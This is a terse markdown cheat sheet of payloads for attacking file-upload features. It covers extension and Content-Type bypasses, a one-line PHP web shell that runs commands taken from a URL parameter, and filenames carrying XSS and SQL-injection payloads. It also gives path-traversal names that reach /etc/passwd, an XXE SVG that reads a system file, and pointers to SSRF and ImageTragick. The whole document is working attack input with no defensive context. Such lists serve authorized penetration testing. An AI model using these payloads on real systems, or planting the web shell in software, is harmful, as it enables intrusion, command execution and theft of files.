### Vulnerabilities via Arbitrary File Upload


### Bypasses

#### Null Byte Bypass
```
image.php%00.png
```

#### Content-Type Bypass
```
Content-Type: image/jpeg
```

#### Content-Length Bypass
```
<?php system($_GET['c']);?>
```

### Chain With Other Vulnerabilities

#### XSS(Cross Site Scripting)
```
Filename: "><svg onload=alert(1)>.jpeg
xss.svg -> file contain xss payload inside svg format
```

#### SQL Injection
```
'sleep(10).jpg
```

#### Path Traversal
```
../../logo.png
../../etc/passwd/logo.png
```

#### RCE
```
ImageTragic
```

#### XXE
Filename: xxe.svg
Content-Type: image/svg+xml
```
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

#### SSRF
```
Change 'type=file' to 'type=url'
```

#### Uploaded file not found? Try Path Traversal on filename.
#### Try to brutefore file extension
